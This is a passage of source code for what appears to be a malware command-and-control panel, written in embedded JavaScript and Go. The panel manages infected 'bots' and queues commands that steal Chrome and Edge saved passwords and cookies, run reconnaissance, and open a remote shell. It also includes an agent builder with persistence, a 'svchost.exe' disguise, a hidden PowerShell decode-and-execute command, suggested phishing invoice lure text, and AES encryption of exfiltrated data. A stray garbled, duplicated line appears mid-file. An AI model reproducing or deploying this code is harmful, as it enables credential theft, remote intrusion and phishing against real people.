      '<div class="shell-card-body" id="'+sid+'">'+
        '<pre>'+outputEsc+'</pre>'+
        '<div class="sc-toolbar">'+
          '<button class="copy-btn" onclick="copyText(decodeURIComponent(\''+encodeURIComponent(output)+'\'))">\uD83D\uDCCB Copy Output</button>'+
          '<span style="color:var(--muted);font-size:10px;margin-left:auto">'+lines+' lines / '+(output.length)+' chars</span>'+
        '</div>'+
      '</div>'+
    '</div>';
  }).join('');
}

function toggleShellCard(id){
  const body=document.getElementById(id);
  const header=body.previousElementSibling;
  body.classList.toggle('open');
  header.classList.toggle('open');
}

function toggleAllShellCards(expand){
  document.querySelectorAll('.shell-card-body').forEach(b=>{
    if(expand){b.classList.add('open');b.previousElementSibling.classList.add('open')}
    else{b.classList.remove('open');b.previousElementSibling.classList.remove('open')}
  });
}

function filterAllData(q){
  q=(q||'').toLowerCase();
  // Filter password cards
  document.querySelectorAll('.pw-card').forEach(el=>{
    const t=el.getAttribute('data-search')||'';
    el.style.display=!q||t.includes(q)?'':'none';
  });
  // Filter cookie domain groups
  document.querySelectorAll('.ck-domain-group').forEach(el=>{
    const domMatch=(el.getAttribute('data-search')||'').includes(q);
    const rows=el.querySelectorAll('tbody tr');
    let anyRowMatch=false;
    rows.forEach(row=>{
      const t=row.getAttribute('data-search')||'';
      const match=!q||domMatch||t.includes(q);
      row.style.display=match?'':'none';
      if(match)anyRowMatch=true;
    });
    el.style.display=!q||domMatch||anyRowMatch?'':'none';
  });
  // Filter shell cards
  document.querySelectorAll('.shell-card').forEach(el=>{
    const t=el.getAttribute('data-search')||'';
    el.style.display=!q||t.includes(q)?'':'none';
  });
}

function refreshDataTab(){
  const sel=document.getElementById('dataBotSelect');
  if(sel.value)loadBotData(sel.value);
  else initDataTab();
}

async function viewResults(botId){
  showTab2('data');
  const sel=document.getElementById('dataBotSelect');
  sel.value=botId;
  await loadBotData(botId);
}

function showTab2(t){
  document.querySelectorAll('[id^=t-]').forEach(e=>e.classList.add('hidden'));
  document.getElementById('t-'+t).classList.remove('hidden');
  document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));
  document.querySelectorAll('.tab')[['dashboard','data','logs','builder'].indexOf(t)].classList.add('active');
  if(t==='data')initDataTab();
}

async function refresh(){
  try{
  const[bots,stats]=await Promise.all([
    fetch('/api/panel/bots',H()).then(r=>r.json()),
    fetch('/api/panel/stats',H()).then(r=>r.json())
  ]);
  document.getElementById('uptime').textContent='Uptime: '+stats.uptime;
  document.getElementById('stats').innerHTML=
    st(stats.total_bots,'',' BOTS')+st(stats.active,'g','ACTIVE')+
    st(stats.sleeping,'y','SLEEPING')+st(stats.dead,'','DEAD')+
    st(stats.total_creds,'','CREDENTIALS');
  document.getElementById('bots').innerHTML=(bots||[]).map(b=>{
    const safeId=esc(b.id);
    return '<tr><td><code>'+safeId.substr(0,8)+'</code></td><td>'+esc(b.hostname)+'</td><td>'+esc(b.username)+'</td>'+
    '<td>'+esc(b.external_ip)+'</td><td>'+esc(b.os)+'</td>'+
    '<td>'+(b.elevated?'<span style="color:var(--red)">ADMIN</span>':'user')+'</td>'+
    '<td class="s-'+esc(b.status)+'">'+esc(b.status)+'</td>'+
    '<td>'+ago(b.last_seen)+'</td>'+
    '<td class="actions" style="min-width:340px">'+
    '<button class="btn" style="background:rgba(0,230,118,0.15);border-color:rgba(0,230,118,0.3);color:var(--green)" onclick="stealPasswords(\''+safeId+'\')">🔑 Passwords</button>'+
    '<button class="btn" style="background:rgba(255,193,7,0.15);border-color:rgba(255,193,7,0.3);color:var(--yellow)" onclick="stealCookies(\''+safeId+'\')">🍪 Cookies</button>'+
    '<button class="btn" onclick="recon(\''+safeId+'\')">📡 Recon</button>'+
    '<button class="btn" onclick="shellPrompt(\''+safeId+'\')">💻 Shell</button>'+
    '<button class="btn" style="background:rgba(68,138,255,0.15);border-color:rgba(68,138,255,0.3);color:var(--blue)" onclick="viewResults(\''+safeId+'\')">📋 Results</button>'+
    '<button class="btn danger" onclick="task(\''+safeId+'\',16)">\u2620 Kill</button>'+
    '</td></tr>'}
  ).join('');
  }catch(e){console.error(e)}
}

function st(v,c,l){return '<div class="stat"><div class="n '+c+'">'+v+'</div><div class="l">'+l+'</div></div>'}

function ago(d){
  const s=Math.floor((Date.now()-new Date(d))/1000);
  if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';
  return Math.floor(s/3600)+'h ago';
}

async function task(botId,type,args){
  const body={bot_id:botId,task:{type:type}};
  if(args)body.task.args=args;
  const r=await fetch('/api/panel/task',{method:'POST',...H(),body:JSON.stringify(body)});
  const j=await r.json();
  appendLog('[>] Task queued: bot='+botId.substr(0,8)+' type='+type+' id='+(j.task_id||'?'));
}

function shellPrompt(botId){
  const cmd=prompt('Shell command for '+botId.substr(0,8)+'...:');
  if(cmd){task(botId,1,[cmd]);appendLog('[>] Shell: '+cmd)}
}

function recon(botId){
  const cmds=['cmd /c systeminfo','cmd /c ipconfig /all','whoami /priv','net user',
    'cmd /c dir %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\ 2>nul',
    'cmd /c dir %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\ 2>nul',
    'cmd /c tasklist /FO CSV'];
  cmds.forEach(c=>task(botId,1,[c]));
  appendLog('[>] Recon: '+cmds.length+' tasks queued for '+botId.substr(0,8));
  alert('Recon queued ('+cmds.length+' tasks). Check Results tab in 30s.');
}

function stealPasswords(botId){
  const cmds=[
    'cmd /c type "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State" 2>nul',
    'cmd /c copy /B "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" "%TEMP%\\ld.tmp" >nul 2>nul & certutil -encode "%TEMP%\\ld.tmp" "%TEMP%\\ld.b64" >nul 2>nul & type "%TEMP%\\ld.b64" & del "%TEMP%\\ld.tmp" "%TEMP%\\ld.b64" 2>nul',
    'cmd /c copy /B "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data" "%TEMP%\\ed.tmp" >nul 2>nul & certutil -encode "%TEMP%\\ed.tmp" "%TEMP%\\ed.b64" >nul 2>nul & type "%TEMP%\\ed.b64" & del "%TEMP%\\ed.tmp" "%TEMP%\\ed.b64" 2>nul'
  ];
  cmds.forEach(c=>task(botId,1,[c]));
  appendLog('[>] Passwords: extracting for '+botId.substr(0,8));
  alert('Passwords extraction queued! Click Results in 30s.');
}

function stealCookies(botId){
  const cmds=[
    'cmd /c copy /B "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" "%TEMP%\\ck.tmp" >nul 2>nul & certutil -encode "%TEMP%\\ck.tmp" "%TEMP%\\ck.b64" >nul 2>nul & type "%TEMP%\\ck.b64" & del "%TEMP%\\ck.tmp" "%TEMP%\\ck.b64" 2>nul',
    'cmd /c copy /B "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" "%TEMP%\\ec.tmp" >nul 2>nul & certutil -encode "%TEMP%\\ec.tmp" "%TEMP%\\ec.b64" >nul 2>nul & type "%TEMP%\\ec.b64" & del "%TEMP%\\ec.tmp" "%TEMP%\\ec.b64" 2>nul'
  ];
  cmds.forEach(c=>task(botId,1,[c]));
  appendLog('[>] Cookies: extracting for '+botId.substr(0,8));
  alert('Cookies extraction queued! Click Results in 30s.');
}

function appendLog(msg){
  const log=document.getElementById('taskLog');
  log.textContent+='\n['+new Date().toLocaleTimeString()+'] '+msg;
  log.scrollTop=log.scrollHeight;
}

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/\\/g,'&#92;')}
function copyText(t){navigator.clipboard.writeText(t).then(()=>{}).catch(()=>{const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove()})}

}
function toggleCard(id){var el=document.getElementById(id);if(el)el.style.display=el.style.display==='none'?'':'none'}l=document.getElementById(id);if(el)el.style.display=el.style.display==='none'?'':'none'}
function filterData(q){
  q=q.toLowerCase();
  document.querySelectorAll('.cred-item,.ck-table tbody tr').forEach(el=>{
    const t=el.getAttribute('data-text')||el.textContent.toLowerCase();
    el.style.display=!q||t.includes(q)?'':'none';
  });
}

/* ── Builder Functions ── */
let buildHistory=[];
let selectedFormat='rar';

function selFmt(el,fmt){
  document.querySelectorAll('.format-opt').forEach(e=>e.classList.remove('selected'));
  el.classList.add('selected');
  selectedFormat=fmt;
}

function genToken(){
  const arr=new Uint8Array(16);crypto.getRandomValues(arr);
  const t=Array.from(arr).map(b=>b.toString(16).padStart(2,'0')).join('');
  document.getElementById('bld-token-display').value=t;
}

async function doBuild(){
  const host=document.getElementById('bld-host').value.trim();
  if(!host){alert('C2 Host is required!');return}
  const btn=document.getElementById('buildBtn');
  btn.disabled=true;btn.textContent='BUILDING...';
  const status=document.getElementById('buildStatus');
  const bar=document.getElementById('buildBar');
  const msg=document.getElementById('buildMsg');
  const result=document.getElementById('buildResult');
  status.style.display='block';result.style.display='none';
  bar.style.width='10%';msg.textContent='Generating config...';
  
  const cfg={
    c2_host:host,
    c2_port:parseInt(document.getElementById('bld-port').value)||443,
    campaign:document.getElementById('bld-campaign').value||('OP_'+Date.now()%100000),
    sleep_ms:parseInt(document.getElementById('bld-sleep').value)||10000,
    jitter:parseInt(document.getElementById('bld-jitter').value)||30,
    kill_days:parseInt(document.getElementById('bld-kill').value)||30,
    auto_steal:document.getElementById('bld-autosteal').checked,
    auto_persist:document.getElementById('bld-persist').checked,
    use_https:document.getElementById('bld-proto').value==='https',
    exe_name:document.getElementById('bld-exe').value||'svchost.exe'
  };

  await new Promise(r=>setTimeout(r,300));bar.style.width='30%';msg.textContent='Compiling agent...';

  try{
    const r=await fetch('/api/panel/build',{method:'POST',...H(),body:JSON.stringify(cfg)});
    bar.style.width='80%';msg.textContent='Processing result...';
    const j=await r.json();
    await new Promise(r=>setTimeout(r,300));bar.style.width='100%';

    if(j.status==='success'){
      msg.textContent='Build complete!';
      result.style.display='block';
      document.getElementById('buildInfo').innerHTML=
        'File: <code style="color:var(--text)">'+j.filename+'</code><br>'+
        'Size: <code style="color:var(--text)">'+(j.size/1024).toFixed(1)+' KB</code><br>'+
        'Build ID: <code style="color:var(--text)">'+j.id+'</code><br>'+
        'Campaign: <code style="color:var(--text)">'+cfg.campaign+'</code><br>'+
        'C2: <code style="color:var(--text)">'+cfg.c2_host+':'+cfg.c2_port+'</code>';
      const dlBase='/api/panel/build/download/'+j.id;
      // RAR button — downloads password-protected RAR (Chrome can't scan it!)
      document.getElementById('downloadHta').onclick=async function(){
        try{
          const dr=await fetch(dlBase+'?format=exe',H());
          const pw=dr.headers.get('X-Archive-Password')||'unknown';
          const blob=await dr.blob();
          const cd=dr.headers.get('Content-Disposition')||'';
          const fnMatch=cd.match(/filename="(.+?)"/);
          const fn=fnMatch?fnMatch[1]:(j.filename||'agent.exe');
          const a=document.createElement('a');a.href=URL.createObjectURL(blob);
          a.download=fn;document.body.appendChild(a);a.click();
          setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove()},200);
          document.getElementById('decodePre').textContent='Downloaded: '+fn+' (direct EXE, no password needed)'+'\n\nSend to target with message:\n"Please open the attached invoice. Password: '+pw+'"';
          document.getElementById('decodeCmd').style.display='block';
        }catch(e){alert('Download failed: '+e.message)}
      };
      // Encoded .dat button — for manual decode
      document.getElementById('downloadEnc').onclick=async function(){
        try{
          const dr=await fetch(dlBase+'?format=enc',H());
          const xorKey=dr.headers.get('X-Decode-Key')||'0xAB';
          const origName=dr.headers.get('X-Original-Name')||j.filename;
          const blob=await dr.blob();
          const a=document.createElement('a');a.href=URL.createObjectURL(blob);
          a.download='update_'+j.id.substr(0,8)+'.dat';
          document.body.appendChild(a);a.click();
          setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove()},200);
          const cmd='$k='+xorKey+';$f=\"update_'+j.id.substr(0,8)+'.dat\";$d=[IO.File]::ReadAllBytes($f);for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i] -bxor $k};[IO.File]::WriteAllBytes(\"'+origName+'\",$d);Start-Process .\\'+origName+' -WindowStyle Hidden;Remove-Item $f';
          document.getElementById('decodePre').textContent=cmd;
          document.getElementById('decodeCmd').style.display='block';
        }catch(e){alert('Download failed: '+e.message)}
      };
      buildHistory.unshift({id:j.id,campaign:cfg.campaign,c2:cfg.c2_host+':'+cfg.c2_port,exe:j.filename,size:j.size,time:new Date().toLocaleString()});
      updateBuildHistory();
    }else{
      msg.innerHTML='<span style="color:var(--red)">BUILD FAILED: '+esc(j.error||'unknown error')+'</span>';
    }
  }catch(e){
    msg.innerHTML='<span style="color:var(--red)">Error: '+e.message+'</span>';
  }
  btn.disabled=false;btn.textContent='BUILD AGENT';
}

function updateBuildHistory(){
  const el=document.getElementById('buildHistory');
  if(buildHistory.length===0){el.textContent='No builds yet.';return}
  let html='<table class="ck-table"><thead><tr><th>Time</th><th>Campaign</th><th>C2</th><th>File</th><th>Size</th><th></th></tr></thead><tbody>';
  for(const b of buildHistory){
    html+='<tr><td>'+b.time+'</td><td style="color:var(--yellow)">'+b.campaign+'</td><td>'+b.c2+'</td>';
    html+='<td><code>'+b.exe+'</code></td><td>'+(b.size/1024).toFixed(0)+'KB</td>';
    html+='<td><button class="copy-btn" onclick="dlBuild(\''+b.id+'\')">DL</button></td></tr>';
  }
  html+='</tbody></table>';el.innerHTML=html;
}
function dlBuild(id){
  fetch('/api/panel/build/download/'+id+'?format=enc',H())
  .then(r=>r.blob()).then(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=id+'.enc';a.click()})
}
</script></body></html>`

// ── Helpers ──

func (h *C2Handler) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		token := strings.TrimPrefix(auth, "Bearer ")

		// v4.3: Legacy token — compare via bcrypt hash (no plaintext comparison)
		if bcrypt.CompareHashAndPassword(legacyTokenHash, []byte(token)) == nil {
			r.Header.Set("X-Operator", "legacy")
			r.Header.Set("X-Role", "admin")
			next(w, r)
			return
		}

		// v4.0: Try session-based auth
		if h.Auth != nil {
			if session, valid := h.Auth.ValidateSession(token); valid {
				r.Header.Set("X-Operator", session.Username)
				r.Header.Set("X-Role", string(session.Role))
				next(w, r)
				return
			}
		}

		http.Error(w, "unauthorized", 401)
	}
}

// v4.0: Audit log endpoint
func (h *C2Handler) handleAuditLog(w http.ResponseWriter, r *http.Request) {
	role := r.Header.Get("X-Role")
	if role != "admin" {
		http.Error(w, "forbidden — admin only", 403)
		return
	}
	entries := h.Auth.GetAuditLog(200)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entries)
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// v5.0 FIX C-7: Only trust CF-Connecting-IP (set by Cloudflare), never X-Forwarded-For
func extractIP(r *http.Request) string {
	if cfIP := r.Header.Get("CF-Connecting-IP"); cfIP != "" {
		return strings.TrimSpace(cfIP)
	}
	// Fallback: use RemoteAddr directly (don't trust XFF)
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// v5.0 FIX H-5: Sanitize botID to prevent path traversal
func sanitizeBotID(id string) string {
	for _, c := range id {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return ""
		}
	}
	if len(id) < 8 || len(id) > 64 {
		return ""
	}
	return id
}

// v5.0 FIX C-4: Bot auth middleware for module downloads
func (h *C2Handler) botAuthModuleMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		botID := r.Header.Get("X-Bot-ID")
		token := r.Header.Get("X-Bot-Token")
		if botID == "" || token == "" {
			http.Error(w, "unauthorized", 401)
			return
		}
		h.tokenMu.RLock()
		expected, ok := h.BotTokens[botID]
		h.tokenMu.RUnlock()
		if !ok {
			// Try to regenerate from persistence
			if h.Store.Get(botID) != nil {
				expected = h.generateBotToken(botID)
				ok = true
			}
		}
		if !ok || !hmac.Equal([]byte(token), []byte(expected)) {
			http.Error(w, "unauthorized", 401)
			return
		}
		next(w, r)
	}
}

// encryptExfil encrypts plaintext with AES-256-GCM.
// Key = HMAC-SHA256(BotSecret, botID) - unique per bot, never stored on disk.
// Format: [12-byte nonce][ciphertext+16-byte tag]
func (h *C2Handler) encryptExfil(botID string, plaintext []byte) ([]byte, error) {
	mac := hmac.New(sha256.New, []byte(h.BotSecret))
	mac.Write([]byte("exfil:" + botID))
	key := mac.Sum(nil) // 32 bytes = AES-256

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil, err
	}
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// decryptExfil reverses encryptExfil. Used by panel/view_exfil tooling.
func (h *C2Handler) decryptExfil(botID string, data []byte) ([]byte, error) {
	mac := hmac.New(sha256.New, []byte(h.BotSecret))
	mac.Write([]byte("exfil:" + botID))
	key := mac.Sum(nil)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aesGCM.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return aesGCM.Open(nil, nonce, ciphertext, nil)
}
